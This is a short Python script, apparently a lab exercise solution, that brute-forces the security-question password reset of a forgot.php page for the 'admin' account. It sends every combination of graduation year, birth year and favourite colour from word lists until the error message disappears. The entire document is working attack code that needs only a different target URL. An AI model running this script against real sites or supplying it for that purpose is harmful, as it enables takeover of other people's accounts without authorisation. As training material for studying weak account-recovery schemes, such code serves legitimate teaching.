import requests

url = 'http://localhost:2222/forgot.php'  # Change this to your actual lab URL

username = 'admin'

# Load guess lists
with open('years.txt') as f:
    years = [line.strip() for line in f if line.strip().isdigit()]

with open('colors.txt') as f:
    colors = [line.strip().lower() for line in f if line.strip()]

total = len(years) * len(years) * len(colors)
print(f"Total combinations to test: {total}")

count = 0
for grad in years:
    for birth in years:
        for color in colors:
            data = {
                'username': username,
                'grad_year': grad,
                'birth_year': birth,
                'favorite_color': color
            }

            response = requests.post(url, data=data)
            count += 1

            if "Incorrect answers. Try again" not in response.text:
                print(f"\n--- Possible Match ---")
                print(f"Grad: {grad}, Birth: {birth}, Color: {color}")
                print(f"Checked {count}/{total}")
                exit()

            if count % 10000 == 0:
                print(f"Checked {count}/{total} combinations...")

print("No valid combination found.")
